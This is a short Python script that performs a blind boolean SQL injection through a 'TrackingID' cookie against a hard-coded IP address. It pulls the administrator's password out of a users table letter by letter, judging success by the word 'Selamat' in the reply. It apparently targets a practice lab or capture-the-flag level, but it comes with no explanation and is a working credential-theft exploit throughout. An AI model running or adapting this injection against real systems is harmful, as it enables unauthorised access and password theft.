import requests

url = "http://178.128.112.149/5_advance"

ans = ""
for j in range(1, 20):
    for i in range(0, 26):
        cookie = {"TrackingID" : f"aW5kb25lc2lh\' AND (SELECT SUBSTRING(password,{j},1) FROM users WHERE username='administrator')='{chr(ord('a') + i)}'--"}

        p = requests.post(url, cookies=cookie)
        
        s = p.text
        if("Selamat" in s):
            ans += chr(ord('a') + i)
    print(ans)

